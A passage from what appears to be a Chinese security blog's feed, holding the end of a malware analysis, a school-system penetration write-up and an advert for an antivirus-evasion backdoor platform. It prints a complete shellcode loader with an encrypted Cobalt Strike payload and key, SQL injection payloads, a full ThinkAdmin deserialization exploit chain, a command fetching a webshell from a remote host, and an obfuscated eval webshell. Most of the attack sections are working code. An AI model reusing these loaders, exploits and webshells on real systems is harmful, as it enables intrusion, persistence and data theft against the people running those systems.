ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64  ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(12288), ctypes.c_int(64))  buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)  eval(base64.b64decode(&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&#39;))  handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))  ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))def rc4(text, key):  key = hashlib.md5(key).hexdigest()  text = base64.b64decode(text)  result = &#39;&#39;  key_len = len(key)  box = list(range(256))  j = 0  for i in range(256):     j = (j + box[i] + ord(key[(i % key_len)])) % 256     box[i], box[j] = box[j], box[i]  i = j = 0  for element in text:     i = (i + 1) % 256     j = (j + box[i]) % 256     box[i], box[j] = box[j], box[i]     k = chr(element ^ box[((box[i] + box[j]) % 256)])     result += k  return resultif __name__ == &#39;__main__&#39;:  b = &#39;24LfU140d71x8NG78Y79RFNXRJanRORJMeYHYusdrdthA5ze2q9sx7gEZUtrpysR9EkzxP5sNbhA9sHY2QCJ014rV3Ynumbfg1mGe87M/kmlAbd93FC0v13PI+mBOiDE5Plt9wqib1srOudHMS6PY79V14jwaF5RTo5Q76FcuYAg5vWyjU4wmquSknlf3DaN0/YpOuCn+qLiP8AlCYyy1j/8WzgVW87NdyzEO2HP5HZWfi0BiRXk8qopN8qMZjmltuE/FfgSza412HwM6d5vU7wuki4R5w3e2dzBSCQ6HSmSXc/rjKPLwkXhnKblzauanHQQUprU43eJ6A3FMLPyBwUUmXiE84r0pD0sR/YNBpI+xpayWRa/3hnWWaYAZNhZ5I82v2gUK1P0IQyXyLBHjGQejFptrZQE+5t2mJgOaIv+kgilCdHR7UsIyS3CDLlzX/241f6fmTUCTXon68Gey0bx3BYdMjIwpdCqxBBqJxyFNNqNhPYgQGWUZ1/GcGK4IN3+zFbS/Q+X8QQW2n9+r/lW/BAFF9bZbQTGPtt9GPfQNRObgy+ucbRkS/Ln+TZpxTtzW8pPmUdMtW1/tq1BHsnexwnRzyJeTEbTTOyvxj+uG0KGLfXMX9UbAnNHkNyhs/uPEKvB7Wv98FHmS8F0fokZQCBrv4xwE1b0fsBiq51t+i8ls+dfTyhdAC9tkkQS1j5HnSXiF4SP/ew3dISqoLp6gds6r+XhT1aLMQXmlnx8f7s+eUw9pydXiG5VmBjV8d/2AGsMuh7ZLTssXi5bgSL/U5S9D/dYt2U0O3O+UhmUE78PPn5aHX+ogmuXesn5AfnItZ7F66/cneKwcsdnUqKtWiW0SVHd75QTU+bnlIEgCE9iTqy2MZDPCeqGawxz28H3RGnCivK/48+7jPHEgNMmV7X5FFtnCSnuwDhyDSr6aIT82Ct8k7hoDuOSaPl00gTI2tT5NlhOt+4xepya0zyK/Os3R+P0tobg0hiSt6PhC6RiphkzC8mt+1a1ATqLnIoC7aw0I/eGDacgBXUwhSDNOK52fq3GnUZoTBOfWdHXs67qF2tQ2qEipNcI29gict6kZIwgwut6sK8F5R+njGdtUxeidh9g7tphQYOifvFzzQ5p78h2HSB6g/yETLZksR7xIOKYKILm5IkaU0jM+qI9IKh9+gjJXBcHPtGgmzDzFLdM2ObDr2vDFRDVylXVfUaGnZ4KmCN4Sn60WRSgH2SMjbL11wKPQ3H0dDZ7AsIDgskmaZa1f/02JYdiVAJF2379mpEQa/M89YpDEBVzlJRb8ikw3ON9PnH3zw4cvvs3uLjpfrV3zi5CPgCIa9u0DlE8aEsuLtFPszJA/Q+pQJTgHk1mt33MpQzDo/zCRAsCQ7/SjCa8ETECbvXrrOrC6gsEBrmTeRGzGOS2fxsxc2FB585NZXKHNWrwg6IS4myDWjTKUMy9GWyy8zd9hxvXyzNLKfZANZ2wnlSgpzYVb8Aj8Ln6cxCk+VKXh7zWc7JA+mD6GT2d9Y/n3a1RKgEYi/gtpwAPAWxhCiZsBeqfgtX9MFtv8AR/YU3g8VwRLswsJUo8iHwx9/RHtUGvkczLnphkQpJmuyVHb+stPkZc82wiUw63SX8va2mAnHcoOVW1di9HLQHwxKHKVPQ=&#39;  mm = &#39;king6666&#39;  c = rc4(b, mm.encode(&#39;utf-8&#39;))  code = bytearray(base64.b64decode(c))  shellCodeLoad(code)</code></pre><p>分析得出该恶意样本是通过rc4算法解密base64加密的shellcode</p><p>并且使用VirtualAlloc开辟内存空间放入内存中执行</p><p><strong>编写解密脚本</strong></p><pre><code class="python">import ctypes, urllib, base64, requests, hashlibdef rc4(text, key):  key = hashlib.md5(key).hexdigest()  text = base64.b64decode(text)  result = &#39;&#39;  key_len = len(key)  box = list(range(256))  j = 0  for i in range(256):     j = (j + box[i] + ord(key[(i % key_len)])) % 256     box[i], box[j] = box[j], box[i]  i = j = 0  for element in text:     i = (i + 1) % 256     j = (j + box[i]) % 256     box[i], box[j] = box[j], box[i]     k = chr(element ^ box[((box[i] + box[j]) % 256)])     result += k  return resultb = &#39;24LfU140d71x8NG78Y79RFNXRJanRORJMeYHYusdrdthA5ze2q9sx7gEZUtrpysR9EkzxP5sNbhA9sHY2QCJ014rV3Ynumbfg1mGe87M/kmlAbd93FC0v13PI+mBOiDE5Plt9wqib1srOudHMS6PY79V14jwaF5RTo5Q76FcuYAg5vWyjU4wmquSknlf3DaN0/YpOuCn+qLiP8AlCYyy1j/8WzgVW87NdyzEO2HP5HZWfi0BiRXk8qopN8qMZjmltuE/FfgSza412HwM6d5vU7wuki4R5w3e2dzBSCQ6HSmSXc/rjKPLwkXhnKblzauanHQQUprU43eJ6A3FMLPyBwUUmXiE84r0pD0sR/YNBpI+xpayWRa/3hnWWaYAZNhZ5I82v2gUK1P0IQyXyLBHjGQejFptrZQE+5t2mJgOaIv+kgilCdHR7UsIyS3CDLlzX/241f6fmTUCTXon68Gey0bx3BYdMjIwpdCqxBBqJxyFNNqNhPYgQGWUZ1/GcGK4IN3+zFbS/Q+X8QQW2n9+r/lW/BAFF9bZbQTGPtt9GPfQNRObgy+ucbRkS/Ln+TZpxTtzW8pPmUdMtW1/tq1BHsnexwnRzyJeTEbTTOyvxj+uG0KGLfXMX9UbAnNHkNyhs/uPEKvB7Wv98FHmS8F0fokZQCBrv4xwE1b0fsBiq51t+i8ls+dfTyhdAC9tkkQS1j5HnSXiF4SP/ew3dISqoLp6gds6r+XhT1aLMQXmlnx8f7s+eUw9pydXiG5VmBjV8d/2AGsMuh7ZLTssXi5bgSL/U5S9D/dYt2U0O3O+UhmUE78PPn5aHX+ogmuXesn5AfnItZ7F66/cneKwcsdnUqKtWiW0SVHd75QTU+bnlIEgCE9iTqy2MZDPCeqGawxz28H3RGnCivK/48+7jPHEgNMmV7X5FFtnCSnuwDhyDSr6aIT82Ct8k7hoDuOSaPl00gTI2tT5NlhOt+4xepya0zyK/Os3R+P0tobg0hiSt6PhC6RiphkzC8mt+1a1ATqLnIoC7aw0I/eGDacgBXUwhSDNOK52fq3GnUZoTBOfWdHXs67qF2tQ2qEipNcI29gict6kZIwgwut6sK8F5R+njGdtUxeidh9g7tphQYOifvFzzQ5p78h2HSB6g/yETLZksR7xIOKYKILm5IkaU0jM+qI9IKh9+gjJXBcHPtGgmzDzFLdM2ObDr2vDFRDVylXVfUaGnZ4KmCN4Sn60WRSgH2SMjbL11wKPQ3H0dDZ7AsIDgskmaZa1f/02JYdiVAJF2379mpEQa/M89YpDEBVzlJRb8ikw3ON9PnH3zw4cvvs3uLjpfrV3zi5CPgCIa9u0DlE8aEsuLtFPszJA/Q+pQJTgHk1mt33MpQzDo/zCRAsCQ7/SjCa8ETECbvXrrOrC6gsEBrmTeRGzGOS2fxsxc2FB585NZXKHNWrwg6IS4myDWjTKUMy9GWyy8zd9hxvXyzNLKfZANZ2wnlSgpzYVb8Aj8Ln6cxCk+VKXh7zWc7JA+mD6GT2d9Y/n3a1RKgEYi/gtpwAPAWxhCiZsBeqfgtX9MFtv8AR/YU3g8VwRLswsJUo8iHwx9/RHtUGvkczLnphkQpJmuyVHb+stPkZc82wiUw63SX8va2mAnHcoOVW1di9HLQHwxKHKVPQ=&#39;mm = &#39;king6666&#39;c = rc4(b, mm.encode(&#39;utf-8&#39;))code = bytearray(base64.b64decode(c))print(code)</code></pre><p>得到其shellcode</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304192048026.png" alt="image"></p><p>回连地址为<a href="http://www.alibababaa.com/">www.alibababaa.com</a></p><p>为典型的cobaltstrike https x64 beacon shellcode</p><p>至此，分析结束</p><h2 id="0x02-后言"><a href="#0x02-后言" class="headerlink" title="0x02 后言"></a>0x02 后言</h2><p>后来做这份样本的同学通过微信公众号联系到了我，哈哈哈，说当时看到是自己的域名难受的一笔，被各种拉黑</p><p>萍水相逢尽是他乡之客</p>]]></content>
      
      
      
        <tags>
            
            <tag> 样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次奇妙的学校渗透之旅</title>
      <link href="/2020/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E5%A6%99%E7%9A%84%E5%AD%A6%E6%A0%A1%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/"/>
      <url>/2020/11/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A5%87%E5%A6%99%E7%9A%84%E5%AD%A6%E6%A0%A1%E6%B8%97%E9%80%8F%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h3><p>由于疫情问题，学校的易班APP新增了打卡系统，每天需要进行晨检，午检打卡，忘记的话就是上千字检讨</p><p>本人对于这种“形式主义”深感不满，于是准备操作一番</p><p><img src="https://i.loli.net/2020/11/13/9tK5Iyozsp4rPq7.jpg" alt="IMG_20201030_190004"></p><p>非常幸运，校级“易班”系统的负责人就是我们团队的指导老师，</p><p>在取得他的授权后，便开始了对于易班系统的曲折而又精彩的渗透</p><p><strong>在此鸣谢M78sec的所有成员</strong></p><h3 id="0x02踩点"><a href="#0x02踩点" class="headerlink" title="0x02踩点"></a>0x02踩点</h3><p>基本的信息搜集咱们就不多说了</p><p>根据老师口述，该域名下部署有多项功能系统（包括负载均衡，直播，表白墙，打卡签到系统，心理测试系统等等），因此不同系统使用了不同的多台服务器</p><p>看样不能一劳永逸，需要各个系统、服务器逐个击破，然后摸入核心系统中</p><p>首先打开“易班”系统的首页是这个样子</p><p><img src="https://i.loli.net/2020/11/13/L9kfsIgtYWw8PdC.png" alt="image-20201113133208461"></p><p>不难看出，开发者使用了TP框架，在简单地测试了各种TP 注入，RCE的payload后均以失败告终，看样安全意识还不算太差</p><p>域名下的首页完全就是一个报错页面，没有任何功能点和信息</p><p>俗话说得好，信息搜集的好坏直接决定了我们渗透的成败，因此我们绝对不能疏忽大意。</p><p>我们先来fuzz一级目录</p><p><img src="https://i.loli.net/2020/11/13/9TvMCqsmjP8n5yK.png" alt="image-20201113134315588"></p><p>成果还不错，不少目录和功能点，随后我们继续fuzz各个一级目录的二级目录，不断摸索该域名下部署的功能点</p><p>具体的就不上图了，因为一级目录太多了。</p><p>了解清楚功能点后，直接脱裤子开干</p><h3 id="0x03-心理健康系统的渗透（IIS短文件名–-gt-老登录口–-gt-爆破–-gt-新登录口–-gt-上传）"><a href="#0x03-心理健康系统的渗透（IIS短文件名–-gt-老登录口–-gt-爆破–-gt-新登录口–-gt-上传）" class="headerlink" title="0x03 心理健康系统的渗透（IIS短文件名–&gt;老登录口–&gt;爆破–&gt;新登录口–&gt;上传）"></a>0x03 心理健康系统的渗透（IIS短文件名–&gt;老登录口–&gt;爆破–&gt;新登录口–&gt;上传）</h3><p>通过一级目录爆破，爆破出</p><p><a href="http://xxx.xxx.edu.cn/psy%E8%BF%99%E4%B8%AA%E8%B7%AF%E5%BE%84">http://xxx.xxx.edu.cn/psy这个路径</a></p><p>发现其中部署了心理教育健康系统，中间件为IIS</p><p>但是心理健康系统登录口有验证码机制，而且验证码不容易识别</p><p><img src="https://i.loli.net/2020/11/13/sfTZbxvCE6re7LH.png" alt="image-20201113135959569"></p><p>立马想到iis短文件名特性</p><p>随后通过iis短文件名目录扫描工具（<a href="https://github.com/lijiejie/IIS_shortname_Scanner%EF%BC%89%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F">https://github.com/lijiejie/IIS_shortname_Scanner）进行扫描</a></p><p>!(<a href="https://i.loli.net/2020/11/13/eBsFcAxPQ84OJi1.jpg">https://i.loli.net/2020/11/13/eBsFcAxPQ84OJi1.jpg</a>) </p><p>获取到老的其他系统登录口</p><p><a href="http://xxx.xxx.edu.cn/psy/Login2.aspx">http://xxx.xxx.edu.cn/psy/Login2.aspx</a></p><p><img src="https://i.loli.net/2020/11/13/rwOx7TJbjAasNU1.png" alt="image-20201113135355472"></p><p>如图，没有任何验证码机制</p><p>直接Burp Cluster bomb式爆破</p><p>成功得到其他系统的弱口令admin,Aa123456</p><p>但是老系统其他页面已经删除，无法正常登入后台</p><p><img src="https://i.loli.net/2020/11/13/6sFRtDz81TpKvVy.png" alt="image-20201113140106639"></p><p>八嘎呀路，不是良民的干活！</p><p>但推测新老系统用的同一个数据库</p><p>访问新系统</p><p><a href="http://xxx.xxx.edu.cn/psy/Login.aspx">http://xxx.xxx.edu.cn/psy/Login.aspx</a></p><p>使用密码admin,Aa123456成功登陆</p><p><img src="https://i.loli.net/2020/11/13/97j31IzLdiktCEg.png" alt="image-20201113140540357"> </p><p>后台翻找上传点</p><p>上传点在</p><p><a href="http://xxx.xxx.edu.cn/psy/ScaleManage/ScaleEdit.aspx?ScaleListID=1">http://xxx.xxx.edu.cn/psy/ScaleManage/ScaleEdit.aspx?ScaleListID=1</a></p><p>量表平台这边的添加题目存在任意文件上传(话说这个上传点…可以说是相当隐蔽了..找了好久才找到)</p><p><img src="https://i.loli.net/2020/11/13/qYmMlw6O5EaHkds.png" alt="image-20201113140741415"> </p><p>上传aspx会莫名其妙跳转，asp不解析，直接传了个asmx的马</p><p>通过awvs 10的调试模块执行命令</p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221210801913-1610515774.png" alt="image"></p><p>权限为net service</p><p>使用cobaltstrike直接powershell一句话上权限</p><p><img src="https://i.loli.net/2020/11/13/JhNuE2WT1ItbUco.png" alt="image-20201113141153516"></p><p>结果补丁貌似比较死。。</p><p>各种本地提权Exp上了一遍，没什么逼用</p><p>Com组件，土豆上了也提不下来，先这样吧，提权要是提下来了再补充</p><p>心理健康系统宣布初步拿下</p><h3 id="0x04-直播系统接口注入"><a href="#0x04-直播系统接口注入" class="headerlink" title="0x04 直播系统接口注入"></a>0x04 直播系统接口注入</h3><p>在进入直播系统后，发现没什么可以利用的点，大概开发还没有完成</p><p><a href="https://imgchr.com/i/DpP1rn"><img src="https://s3.ax1x.com/2020/11/13/DpP1rn.png" alt="DpP1rn.png"></a></p><p>但是在BURP中，我发现了一个ajax接口的请求,下体一硬</p><p><img src="https://i.loli.net/2020/11/13/LMeBq46tPazNXKo.png" alt="image-20201113142150278"></p><p>http请求如下</p><pre><code>POST /index.php/Live/index/seat_ajax.html HTTP/1.1Host: xxx.xxx.edu.cnContent-Length: 24Accept: */*Origin: http://xxx.xxx.edu.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Linux; U; Android 5.1; zh-CN; 1501_M02 Build/LMY47D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.818 U3/0.8.0 Mobile Safari/534.30Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://xxx.xxx.edu.cn/index.php/Live/index/seat?place_id=10&amp;active_id=20Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Cookie: ASP.NET_SessionId=s0clwrginz0rw3x0smtwtsgg; PHPSESSID=7985bf0a5f38e5922a651ac1f4ef9b1a; PHPSESSID=7985bf0a5f38e5922a651ac1f4ef9b1aConnection: close place_id=10&amp;active_id=20</code></pre><p> <img src="https://i.loli.net/2020/11/13/eI6CjpW8L5BRYwN.png" alt="image-20201113141807391"></p><p>进行fuzz找到SQLI Payload</p><p><img src="https://i.loli.net/2020/11/14/RSwQrOYcgzAtW4V.png" alt="image-20201114103336060"></p><p>两个id参数都存在union注入</p><p><a href="https://imgchr.com/i/DpuwbF"><img src="https://s3.ax1x.com/2020/11/13/DpuwbF.png" alt="DpuwbF.png"></a></p><p>构造payload</p><p><code>) UNION ALL SELECT NULL,NULL,NULL,NULL,user(),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Neqy</code></p><p>如图成功获得current_user信息</p><p><a href="mailto:\">“_root@10.40.0.22</a></p><p>构造payload</p><p><code>place_id=10) UNION ALL SELECT NULL,NULL,NULL,NULL,group_concat(SCHEMA_NAME),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL from information_schema.schemata-- Neqy&amp;active_id=20&amp;active_id=20</code></p><p> <img src="https://i.loli.net/2020/11/13/PDj1oTOUBwv9zQc.png" alt="image-20201113142647096"></p><p>其他的表、列、数据、在此就不演示了，写语句就ok，都非常简单</p><p>SQLMAP自动化演示如图</p><p><img src="https://img2020.cnblogs.com/blog/1771833/202112/1771833-20211221211028612-464219720.png" alt="image"></p><p>后面发现涉及了很多其他系统的库，但并没有摸到我最想要的核心系统的库，因此渗透还得继续</p><h3 id="0X05-一个平淡无奇的B64上传"><a href="#0X05-一个平淡无奇的B64上传" class="headerlink" title="0X05 一个平淡无奇的B64上传"></a>0X05 一个平淡无奇的B64上传</h3><p>FUZZ功能点后，找到了一个未授权可以上传图片的地方</p><p><a href="http://xxx.xxx.edu.cn/v4/public/weui/demo/form12.html">http://xxx.xxx.edu.cn/v4/public/weui/demo/form12.html</a></p><p><a href="https://imgchr.com/i/DpAWkt"><img src="https://s3.ax1x.com/2020/11/13/DpAWkt.png" alt="DpAWkt.png"></a></p><p><a href="https://imgchr.com/i/DpKYIH"><img src="https://s3.ax1x.com/2020/11/13/DpKYIH.png" alt="DpKYIH.png"></a></p><p>发现data:image&#x2F;jpeg时上传jpeg图片</p><p>直接改data改为image&#x2F;php,然后将上传内容base64编码后提交</p><p><img src="https://i.loli.net/2020/11/13/CHZ1PhFIdBJEwo2.png" alt="image-20201113144832373"></p><p>Getshell成功，SYSTEM权限，提权都省了</p><p>!(<a href="https://i.loli.net/2020/11/13/cRyQC3XMA2duFG8.jpg">https://i.loli.net/2020/11/13/cRyQC3XMA2duFG8.jpg</a>)</p><h3 id="0X06-核心系统精彩渗透（Nday反序列化-命令执行绕过-条件竞争Getshell）"><a href="#0X06-核心系统精彩渗透（Nday反序列化-命令执行绕过-条件竞争Getshell）" class="headerlink" title="0X06 核心系统精彩渗透（Nday反序列化+命令执行绕过+条件竞争Getshell）"></a>0X06 核心系统精彩渗透（Nday反序列化+命令执行绕过+条件竞争Getshell）</h3><p>寻寻觅觅，冷冷清清，凄凄惨惨凄凄，终于找到了我们的控制“易班”核心系统</p><p><a href="http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree">http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree</a></p><p><img src="https://i.loli.net/2020/11/13/isfrbkZp7SVD6X8.png" alt="image-20201113145542691"></p><p>胜利就在眼前…不睡觉也要把他给搞下来</p><p>各种fuzz，各种操作一块安排上去，发现并没有什么卵用，依旧日不进去</p><p>难道就此放弃？？不可能，这不是我们的风格</p><p>我在仔细查看页面JS的时候，发现了这样一个有趣的信息</p><p><img src="https://i.loli.net/2020/11/13/1vFsBm49guR3VaU.png" alt="image-20201113145944166"></p><p>眼前一亮，妈的ThinkAdmin，正好之前收藏了个反序列化的Nday，安排上！</p><p><img src="https://i.loli.net/2020/11/13/yJ89hnIeBSXvOos.jpg" alt="image-20201113145944166"></p><p><a href="http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree">http://xxx.xxx.edu.cn/v4/public/index.php/admin/login.html?s=admin/api.Update/tree</a></p><pre><code>PostData：rules=a%3A2%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A11%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A19%3A%22%00think%5CModel%00exists%22%3Bb%3A1%3Bs%3A13%3A%22%00%2A%00connection%22%3Bs%3A5%3A%22mysql%22%3Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A0%3A%22%22%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7D%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A3%3A%22123%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A4%3A%22test%22%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3Bs%3A18%3A%22%00think%5CModel%00force%22%3Bb%3A1%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00schema%22%3Ba%3A0%3A%7B%7D%7Di%3A1%3Bi%3A123%3B%7D   //执行whoami</code></pre><p><img src="https://i.loli.net/2020/11/13/7MoP6fIlt9Oe1RU.png" alt="image-20201113150348311"></p><p>下面为反序列化pop链子如下</p><pre><code class="php">&lt;?phpnamespace think;use think\model\Pivot;abstract class Model&#123;  private $lazySave = false;   # save()  private $exists = false;   # updateData()  protected $connection;  protected $name;       # __toString() Conversion.php =&gt;Pivot  private $withAttr = [];     # assert  protected $hidden = [];  private $data = [];  protected $withEvent = false;  private $force = false;  protected $field = [];  protected $schema = [];   function __construct()&#123;    $this-&gt;lazySave = true;    $this-&gt;exists = true;    $this-&gt;withEvent = false;    $this-&gt;force = true;    $this-&gt;connection = &quot;mysql&quot;;    $this-&gt;withAttr = [&quot;test&quot;=&gt;&quot;system&quot;];    $this-&gt;data = [&quot;test&quot;=&gt;&quot;whoami&quot;];    $this-&gt;hidden = [&quot;test&quot;=&gt;&quot;123&quot;];     $this-&gt;field = [];    $this-&gt;schema = [];  &#125;&#125;namespace think\model;use think\Model;\# Model 是一个抽象类，我们找到它的继承类，此处选取的是 Pivot 类class Pivot extends Model&#123;  function __construct($obj=&quot;&quot;)&#123;    parent::__construct();    $this-&gt;name = $obj;     # $this-&gt;name放子类构造方法中赋值，直接放基类属性中初始化不成功  &#125;&#125;$a=new Pivot();echo urlencode(serialize([new Pivot($a),123]));?&gt;</code></pre><p> <img src="https://i.loli.net/2020/11/13/7MoP6fIlt9Oe1RU.png" alt="image-20201113150348311"></p><p>权限为system，哈哈哈哈哈哈，天助我也</p><p>但使用echo命令写shell过程中遇到了很多问题</p><p>①命令不能带空格，而且&lt;&gt;直接在一条命令中出现写shell，否则会报错</p><p>②空格会被转换为+ 而+ 他后端又识别不了</p><p> <img src="https://i.loli.net/2020/11/13/JftkQsum25TDFrb.jpg" alt="image-20201113150348311"> </p><p>经过坚持不懈的手动测试，发现&#x2F;\可以绕过空格的限制</p><p>然后再使用&amp;&amp;来拼接命令，实现对于写入&lt;&gt;检测的绕过</p><p>但是目标机有waf，普通的webshell传上去过几秒就会被杀</p><p>何妨，直接通过条件竞争远程下载免杀的webshell</p><p><strong>构造命令通过条件竞争下载免杀shell</strong></p><p><code>echo/^&lt;^?php&gt;&gt;s1.php&amp;&amp;echo/file_put_contents(&#39;s2.php&#39;,file_get_contents(&#39;http://49.x.x.x:8080/shell.txt&#39;));?^&gt;&gt;&gt;s2.php</code></p><p>免杀shell内容如下</p><pre><code>&lt;?phpfunction test($php_c0d3)&#123;  $password=&#39;skr&#39;;//EnvPwd  $cr=preg_filter(&#39;/\s+/&#39;,&#39;&#39;,&#39;c h r&#39;);  $bs64=preg_filter(&#39;/\s+/&#39;,&#39;&#39;,&#39;bas e64 _de cod e&#39;);  $gzi=$cr(103).$cr(122).$cr(105).$cr(110);  $gzi.=$cr(102).$cr(108).$cr(97).$cr(116).$cr(101);  $c=$bs64($php_c0d3);  $c=$gzi($c);  @eval($c);&#125;$php_c0d3=&#39;S0lNy8xL1VAvzkjNySlILC5W11EBUeX&#39;.&#39;5RSma1rxcKgWZeWm2KvFBroGhrsEh0UogvlIsUC&#39;.&#39;YzTQMiaatUmVqspFnNy1WQARLI1wBprAXi1LLEH&#39;.&#39;A2EXrgdsZrWAA==&#39;;test($php_c0d3);?&gt;</code></pre><p>通过反序列化pop链子生成Postdata</p><p>直接打过去</p><p><a href="http://xxx.xxx.edu.cn/v4/public/s2.php">http://xxx.xxx.edu.cn/v4/public/s2.php</a></p><p>密码Skr</p><p>直接拿下</p><p><a href="https://imgchr.com/i/DpncnS"><img src="https://s3.ax1x.com/2020/11/13/DpncnS.png" alt="DpncnS.png"></a> </p><p>终于拿下了这个打卡，晚点名，考勤的核心系统，adminer进入库中解密管理员密码</p><p>妈的，还想让老子写检讨？？？吃屎去吧</p><p><img src="https://i.loli.net/2020/11/13/5JviyQlHs17LICn.png" alt="image-20201113151136404"></p><p>核心系统宣布拿下~圆满完成任务</p><h3 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h3><p>本次渗透虽然没什么太骚的操作，但是很多地方都是经验使然</p><p>同时非常感谢M78sec朋友们的协助</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BS架构在线Shellcode免杀平台</title>
      <link href="/2020/08/25/BS%E6%9E%B6%E6%9E%84%E5%9C%A8%E7%BA%BFShellcode%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/"/>
      <url>/2020/08/25/BS%E6%9E%B6%E6%9E%84%E5%9C%A8%E7%BA%BFShellcode%E5%85%8D%E6%9D%80%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<p>和几位dalao忙了几天</p><p>利用PHP+Python+GO三门语言写了一个在线shellcode免杀平台</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191618365.png" alt="image-20230419161815346"></p><p>在CS中生成X64的c shellcode，按照平台指定格式提交，即可一键生成免杀后门（过所有国产）</p><p>本人郑重承诺，不含任何后门，欢迎各位reverse确认！为防止滥用，就不开源出来了</p><p>我也不会收集大佬们的c2 ip，今年hw我并不参加</p><p><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191618899.png" alt="image-20230419161856885"></p><p>本在线平台仅限攻防演练、授权渗透测试中使用，严禁用于非法用途（居心叵测之人自重，本系统带有溯源机制）</p><p>使用注册码进行账号注册后，会自动获取最近两次登录的ip并进行绑定，其他ip无法登录，使用注册码前请谨慎<br>考虑</p><p>平台链接联系博主获取</p><p>现免费赠送5个邀请码，如果没领到联系我vx:J0o1ey997，定期会发邀请码</p><p>HXGzVWWxzWCZ63hL3XyHHbbBL5X1QY59</p><p>x1JkgLkNZXvenxBKENFeRw99VWU4JkcI</p><p>2fDUWgCDLPIyz4nlENz3CjJ7ngfjUy3g</p><p>EHF1Bf2JwdunjBtFpjR4xRzGwlGqfzl4</p><p>BJvK7h2CVfK2PdhnKpgxNUdWUEzHFr79</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花儿在不同的季节开放</title>
      <link href="/2020/04/13/%E8%8A%B1%E5%84%BF%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AD%A3%E8%8A%82%E5%BC%80%E6%94%BE/"/>
      <url>/2020/04/13/%E8%8A%B1%E5%84%BF%E5%9C%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AD%A3%E8%8A%82%E5%BC%80%E6%94%BE/</url>
      
